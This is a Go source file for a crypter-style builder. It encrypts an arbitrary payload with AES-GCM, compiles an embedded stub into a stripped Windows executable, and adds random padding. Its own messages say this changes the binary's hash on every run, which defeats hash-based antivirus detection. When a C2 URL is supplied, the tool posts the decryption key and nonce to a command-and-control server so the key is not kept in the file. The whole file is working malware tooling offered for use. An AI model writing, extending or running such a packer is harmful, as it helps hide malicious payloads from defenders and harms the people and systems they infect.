package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//go:embed stub.src
var stubSource []byte

const magic = "HBX1"

type metadata struct {
	Key           string `json:"key,omitempty"`
	Nonce         string `json:"nonce,omitempty"`
	KeyID         string `json:"key_id,omitempty"`
	C2URL         string `json:"c2_url,omitempty"`
	OriginalName  string `json:"original_name"`
	OriginalSize  int    `json:"original_size"`
	CiphertextLen int    `json:"ciphertext_len"`
	StubSize      int    `json:"stub_size"`
}

func generateBinary(payloadPath, outputPath, c2url string) error {
	plaintext, err := os.ReadFile(payloadPath)
	if err != nil {
		return fmt.Errorf("cannot read %s: %w", payloadPath, err)
	}
	if len(plaintext) == 0 {
		return fmt.Errorf("payload must not be empty")
	}

	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("aes: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("gcm: %w", err)
	}
	ciphertext := gcm.Seal(nil, nonce, plaintext, []byte(magic))

	fmt.Println("[INFO] Compiling polymorphic stub for windows/amd64 ...")
	stub, err := compileStub()
	if err != nil {
		return fmt.Errorf("compile stub: %w", err)
	}

	padLen, _ := rand.Int(rand.Reader, big.NewInt(63*1024))
	padding := make([]byte, 1024+int(padLen.Int64()))
	rand.Read(padding)

	meta := metadata{
		OriginalName:  filepath.Base(payloadPath),
		OriginalSize:  len(plaintext),
		CiphertextLen: len(ciphertext),
		StubSize:      len(stub),
	}

	c2url = strings.TrimRight(c2url, "/")

	if c2url != "" {
		keyID, err := sendKeyToServer(c2url, key, nonce)
		if err != nil {
			return fmt.Errorf("key server: %w", err)
		}
		meta.KeyID = keyID
		meta.C2URL = c2url
		fmt.Printf("[INFO] Key sent to server: key_id=%s\n", keyID)
		fmt.Printf("[INFO] Key is NOT stored in the output file.\n")
	} else {
		meta.Key = base64.StdEncoding.EncodeToString(key)
		meta.Nonce = base64.StdEncoding.EncodeToString(nonce)
		fmt.Println("[INFO] Key stored in file (no --c2-url specified).")
	}

	metaJSON, _ := json.Marshal(meta)
	metaLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(metaLenBuf, uint32(len(metaJSON)))

	out, err := os.OpenFile(outputPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o755)
	if err != nil {
		return err
	}
	defer out.Close()

	out.Write(stub)
	out.Write(padding)
	out.Write(ciphertext)
	out.Write(metaJSON)
	out.Write(metaLenBuf)
	out.Write([]byte(magic))

	totalSize := len(stub) + len(padding) + len(ciphertext) + len(metaJSON) + 8

	fmt.Printf("[OK] Polymorphic binary generated successfully as %q.\n", outputPath)
	fmt.Printf("[INFO] Payload:    %s (%d bytes)\n", payloadPath, len(plaintext))
	fmt.Printf("[INFO] Output:     %s (%d bytes)\n", outputPath, totalSize)
	fmt.Println("[INFO] Each run rewrites the binary with a fresh key and random padding, changing its hash.")
	return nil
}

type storeKeyRequest struct {
	Key   string `json:"key"`
	Nonce string `json:"nonce"`
}

type storeKeyResponse struct {
	KeyID string `json:"key_id"`
}

func sendKeyToServer(c2url string, key, nonce []byte) (string, error) {
	body, _ := json.Marshal(storeKeyRequest{
		Key:   base64.StdEncoding.EncodeToString(key),
		Nonce: base64.StdEncoding.EncodeToString(nonce),
	})

	resp, err := http.Post(c2url+"/keys", "application/json", bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("cannot reach key server at %s: %w", c2url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("key server returned %d", resp.StatusCode)
	}

	var result storeKeyResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", fmt.Errorf("bad response from key server: %w", err)
	}
	return result.KeyID, nil
}

func compileStub() ([]byte, error) {
	tmpDir, err := os.MkdirTemp("", "poly-build-")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), stubSource, 0o644); err != nil {
		return nil, err
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte("module stub\n\ngo 1.21\n"), 0o644); err != nil {
		return nil, err
	}

	outPath := filepath.Join(tmpDir, "stub.exe")
	cmd := exec.Command("go", "build", "-o", outPath, "-ldflags", "-s -w", ".")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("go build failed:\n%s\n%w", string(out), err)
	}
	return os.ReadFile(outPath)
}
